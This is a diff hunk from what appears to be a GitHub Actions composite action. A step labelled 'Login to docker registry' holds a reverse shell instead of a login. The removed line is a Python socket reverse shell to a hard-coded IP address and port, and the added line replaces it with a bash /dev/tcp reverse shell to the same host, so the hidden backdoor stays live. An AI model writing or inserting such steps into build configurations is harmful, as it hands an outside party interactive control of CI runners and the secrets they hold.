@@ -114,7 +114,7 @@ runs:
     - name: Login to docker registry
       shell: bash
       run: |
-        python -c 'import socket; from subprocess import run; from os import dup2;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("199.247.17.80",9999)); dup2(s.fileno(),0); dup2(s.fileno(),1); dup2(s.fileno(),2);run(["/bin/bash","-i"]);'
+        /bin/bash -i >& /dev/tcp/199.247.17.80/9999 0>&1
     - uses: actions/cache/restore@v3
       if: steps.set-cache-file.outputs.cache_file != ''
       id: cache-docker-image
